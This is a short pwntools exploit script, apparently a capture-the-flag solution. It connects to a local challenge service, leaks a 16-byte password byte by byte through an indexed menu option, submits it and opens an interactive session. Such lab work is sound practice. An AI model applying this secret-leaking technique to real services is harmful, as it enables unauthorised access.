from pwn import *


p = remote("localhost", 30001)
def make_wish(index):
    p.sendlineafter(b'choice', b'1')
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(index).encode())
    p.recvuntil(b" = '")
    byte = p.recvuntil(b"'\n")[:-2]
    return byte

password = b""

make_wish(16)
for i in range(16):
    byte = make_wish(i)
    password += byte

print(f"{password=}")
assert len(password) == 16

p.sendlineafter(b'choice', b'2')
p.sendlineafter(b': ', password)
p.interactive()